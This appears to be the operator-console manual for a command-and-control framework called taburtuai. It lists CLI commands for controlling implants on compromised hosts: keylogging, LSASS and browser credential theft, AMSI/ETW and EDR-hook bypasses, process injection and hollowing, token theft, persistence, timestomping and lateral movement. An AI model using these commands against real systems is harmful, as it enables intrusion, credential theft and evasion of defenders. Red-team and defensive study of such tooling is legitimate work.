# Operator Console

The interactive console is the primary interface for running an engagement. It connects to the team server once and lets you run all commands without re-specifying the server address.

---

## Starting the Console

```bash
./bin/taburtuai console --server http://192.168.1.10:8080

# With API key auth
./bin/taburtuai console --server http://192.168.1.10:8080 --api-key mytoken

# Using environment variables
export TABURTUAI_SERVER=http://192.168.1.10:8080
export TABURTUAI_API_KEY=mytoken
./bin/taburtuai console
```

**On connection:**
```
  [*] Connected to http://192.168.1.10:8080
  [*] Type help for commands, exit to quit.

[192.168.1.10:8080] ❯ 
```

The prompt shows the server address. History is saved to `/tmp/.taburtuai_history` across sessions.

---

## Agent ID Shorthand

Every command that targets an agent accepts either:
- **Full UUID:** `a1b2c3d4-e5f6-7890-abcd-ef1234567890`
- **Prefix (4+ chars):** `a1b2` — the CLI fuzzy-matches the first agent whose UUID starts with that prefix

```
❯ agents info a1b2
❯ cmd a1b2 "whoami"
❯ screenshot a1b2
```

---

## Complete Command Reference

### Agents

| Command | Description |
|---------|-------------|
| `agents list` | List all agents with status, hostname, username, last seen |
| `agents info <id>` | Full details: OS, architecture, PID, first contact, command count |
| `agents delete <id>` | Remove agent record from database |

### Command Execution

| Command | Description |
|---------|-------------|
| `shell <id>` | Open interactive shell session (readline-driven, exit to close) |
| `cmd <id> "<command>"` | Execute single command and print output |
| `cmd <id> "<command>" --no-wait` | Queue command without waiting for result |
| `cmd <id> "<command>" --timeout 60` | Wait up to 60 seconds for result |
| `status <cmd-id>` | Check status and output of any previously queued command |
| `history <id>` | Show command history for an agent |
| `history <id> --limit 20` | Show last 20 commands |

### File Operations

| Command | Description |
|---------|-------------|
| `files upload <id> <local-path> <remote-path>` | Upload local file to agent |
| `files download <id> <remote-path> <local-path>` | Download file from agent |

### Process Management

| Command | Description |
|---------|-------------|
| `process list <id>` | List all running processes (PID, name, path) |
| `process kill <id> --pid <pid>` | Kill process by PID |
| `process kill <id> --name <name>` | Kill all processes with matching name |
| `process start <id> <exe> [--args "<args>"]` | Start a new process |

### Persistence

| Command | Description |
|---------|-------------|
| `persistence setup <id> --method <method>` | Install persistence |
| `persistence setup <id> --method <method> --name <name> --path <path>` | Full options |
| `persistence remove <id> --method <method> --name <name>` | Remove persistence |

Available methods: `registry_run`, `schtasks_onlogon`, `schtasks_daily`, `startup_folder` (Windows); `cron_reboot`, `systemd_user`, `bashrc` (Linux); `launchagent` (macOS).

### Alternate Data Streams (Windows)

| Command | Description |
|---------|-------------|
| `ads write <id> <local-file> <target:streamname>` | Write file into NTFS ADS |
| `ads read <id> <source:streamname> <local-file>` | Read ADS to local file |
| `ads exec <id> <path:stream.js>` | Execute script from ADS via wscript/cscript |

### LOLBin File Download

| Command | Description |
|---------|-------------|
| `fetch <id> <url> <remote-path>` | Download via certutil (default) |
| `fetch <id> <url> <remote-path> --method bitsadmin` | BITS transfer (looks like Windows Update) |
| `fetch <id> <url> <remote-path> --method curl` | Via curl.exe |
| `fetch <id> <url> <remote-path> --method powershell` | Via WebClient |

### EDR Bypass

| Command | Description |
|---------|-------------|
| `bypass amsi <id>` | Patch AmsiScanBuffer in agent process |
| `bypass amsi <id> --pid <pid>` | Patch AMSI in a remote PID |
| `bypass etw <id>` | Patch EtwEventWrite in agent process |

### Token Manipulation

| Command | Description |
|---------|-------------|
| `token list <id>` | Enumerate accessible process tokens |
| `token steal <id> --pid <pid>` | Steal and impersonate token from process |
| `token make <id> --user <u> --domain <d> --pass <p>` | LogonUser (LOGON32_LOGON_NEW_CREDENTIALS) |
| `token revert <id>` | Revert to original token (RevertToSelf) |
| `token runas <id> <exe> --pid <pid>` | Spawn process under stolen token |
| `token runas <id> <exe> --user <u> --pass <p>` | Spawn process under LogonUser token |

### Reconnaissance

| Command | Description |
|---------|-------------|
| `screenshot <id>` | Capture desktop and print base64 BMP |
| `screenshot <id> --save /tmp/out.bmp` | Save screenshot to local file |
| `keylog start <id>` | Start keylogger |
| `keylog start <id> --duration 60` | Start for 60 seconds then auto-stop |
| `keylog dump <id>` | Retrieve buffered keystrokes |
| `keylog stop <id>` | Stop keylogger and return final buffer |
| `keylog clear <id>` | Discard buffered keystrokes |

### Timestomp

| Command | Description |
|---------|-------------|
| `timestomp <id> <target>` | Copy timestamps from kernel32.dll |
| `timestomp <id> <target> --ref <reference-file>` | Copy from specified reference file |
| `timestomp <id> <target> --time 2021-06-15T09:00:00Z` | Set explicit ISO-8601 timestamp |

### Code Injection

| Command | Description |
|---------|-------------|
| `inject remote <id> --pid <pid> --file <sc.bin>` | CRT injection into remote process |
| `inject remote <id> --pid <pid> --file <sc.bin> --method apc` | APC injection |
| `inject self <id> --file <sc.bin>` | Fileless in-memory exec in agent process |
| `inject ppid <id> <exe> --ppid-name explorer.exe` | Spawn with spoofed parent |
| `inject ppid <id> <exe> --ppid <pid> --args "<args>"` | Explicit PPID + args |

### Advanced Injection

| Command | Description |
|---------|-------------|
| `hollow <id> --file <sc.bin>` | Process hollowing (default host: svchost.exe) |
| `hollow <id> --file <sc.bin> --exe notepad.exe` | Custom host process |
| `hijack <id> --pid <pid> --file <sc.bin>` | Thread hijacking (suspend + RIP patch) |
| `stomp <id> --file <sc.bin> --dll xpsservices.dll` | Module stomping |
| `mapinject <id> --file <sc.bin>` | Section mapping injection (no WriteProcessMemory) |
| `mapinject <id> --file <sc.bin> --pid <pid>` | Cross-process section mapping |

### Credential Access

| Command | Description |
|---------|-------------|
| `creds lsass <id>` | LSASS minidump via MiniDumpWriteDump |
| `creds lsass <id> --output C:\Temp\ls.dmp` | Custom output path on target |
| `creds sam <id>` | Save SAM/SYSTEM/SECURITY hives |
| `creds browser <id>` | Chrome, Edge, Brave, Firefox credentials |
| `creds clipboard <id>` | Read current clipboard content |

### Evasion

| Command | Description |
|---------|-------------|
| `evasion sleep <id> --duration 30` | Obfuscated sleep (XOR memory during 30s wait) |
| `evasion unhook <id>` | Restore NTDLL .text from disk (remove EDR hooks) |
| `evasion hwbp set <id> --addr 0x7FFE1234 --register 0` | Install hardware breakpoint (DR0–DR3) |
| `evasion hwbp clear <id> --register 0` | Remove hardware breakpoint |

### BOF Execution

| Command | Description |
|---------|-------------|
| `bof <id> <file.o>` | Execute Beacon Object File in-memory |
| `bof <id> <file.o> --args-file args.bin` | BOF with packed argument file |

### OPSEC Controls

| Command | Description |
|---------|-------------|
| `opsec antidebug <id>` | Run anti-debug check, print result |
| `opsec antivm <id>` | Run anti-VM/sandbox check, print result |
| `opsec timegate <id> --start 8 --end 18` | Set working-hours window on running agent |
| `opsec timegate <id> --kill-date 2026-12-31` | Set kill date on running agent |

### Network & Pivot

| Command | Description |
|---------|-------------|
| `netscan <id> -t 10.0.0.0/24 -p 445,3389,22` | TCP port scan |
| `netscan <id> -t 10.0.0.1 --banners --wait` | Scan with service banner grab |
| `arpscan <id> --wait` | ARP scan local subnet |
| `socks5 start <id> --addr 127.0.0.1:1080` | Start SOCKS5 proxy |
| `socks5 stop <id>` | Stop SOCKS5 proxy |
| `socks5 status <id>` | Check proxy status |

### Lateral Movement

| Command | Description |
|---------|-------------|
| `lateral wmi <id> <target> "<cmd>"` | Execute via WMI Win32_Process.Create |
| `lateral winrm <id> <target> "<cmd>"` | Execute via WinRM (PS Remoting) |
| `lateral schtask <id> <target> "<cmd>"` | Execute via scheduled task |
| `lateral service <id> <target> "<cmd>"` | Execute via SCM service creation |
| `lateral dcom <id> <target> "<cmd>"` | Execute via DCOM (MMC20) |

### Registry (Windows)

| Command | Description |
|---------|-------------|
| `registry read <id> HKLM\SOFTWARE\key -V value` | Read a registry value |
| `registry write <id> HKCU\Software\key -V val -d data` | Write a registry value |
| `registry delete <id> HKLM\SOFTWARE\key -V value` | Delete value or key |
| `registry list <id> HKLM\SOFTWARE\key` | List subkeys and values |

### Team Server

| Command | Description |
|---------|-------------|
| `team subscribe <name>` | Join live event stream |
| `team operators` | List connected operators |
| `team claim <id> --session <sid>` | Claim exclusive write access to agent |
| `team release <id> --session <sid>` | Release agent claim |
| `team broadcast --session <sid> --message "note"` | Send note to all operators |

### Server Management

| Command | Description |
|---------|-------------|
| `queue stats` | Pending command overview |
| `queue clear <id>` | Flush pending queue for agent |
| `logs` | Last 50 server log entries |
| `logs --limit 100 --level WARN` | Filtered log view |
| `stats` | Server health: agents, commands, uptime |

---

## Keyboard Shortcuts in Console

| Key | Action |
|-----|--------|
| `↑` / `↓` | Navigate command history |
| `Ctrl+C` | Cancel current input |
| `Ctrl+D` or `exit` | Close console |
| `Tab` | (readline completion where supported) |
